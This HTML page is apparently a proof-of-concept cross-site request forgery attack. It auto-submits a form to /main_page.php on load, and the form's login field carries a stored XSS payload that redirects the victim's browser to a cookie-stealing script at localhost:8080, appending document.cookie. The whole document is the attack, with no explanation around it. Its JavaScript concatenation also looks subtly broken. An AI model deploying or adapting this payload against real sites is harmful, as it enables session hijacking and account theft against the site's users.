<html>
	<head>
	</head>
	<body>
		<form action="/main_page.php" method="post">
		<input type="text" name="login" value="<script>location.assign('localhost:8080/cookieStealer.php'.document.cookie)</script>"/></form>
	</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
	$(document).ready(function() {
		var form = $('form');
		form.submit();
	});
</script>
</html>
